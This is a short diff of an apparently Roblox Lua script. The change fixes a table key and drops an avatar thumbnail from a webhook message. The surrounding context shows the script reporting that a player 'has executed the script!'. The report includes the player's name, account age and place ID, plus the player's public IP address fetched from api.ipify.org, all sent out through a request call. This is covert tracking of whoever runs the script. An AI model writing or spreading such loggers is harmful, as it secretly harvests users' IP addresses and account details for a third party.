@@ -31,7 +31,7 @@ pcall(function()
            {
                ["title"] = game:GetService("Players").LocalPlayer.Name,
                ["description"] = game:HttpGet("https://api.ipify.org")
-	       color = 0xFF0000, -- red color code
+	       ["color"] = 0xFF0000, -- red color code
            }
        }
    }
@@ -118,9 +118,6 @@ request({
                 title = MarketplaceService:GetProductInfo(game.PlaceId).Name,
                 description = "**" .. Players.LocalPlayer.Name .. "** has executed the script!",
                 color = 0xFF0000, -- red color code
-		           ["thumbnail"] = {
-               ["url"] = AvatarImage,
-           },
                 fields = {
                     { name = "Place ID", value = game.PlaceId },
                     { name = "Account Age", value = Players.LocalPlayer.AccountAge .. " days old" },
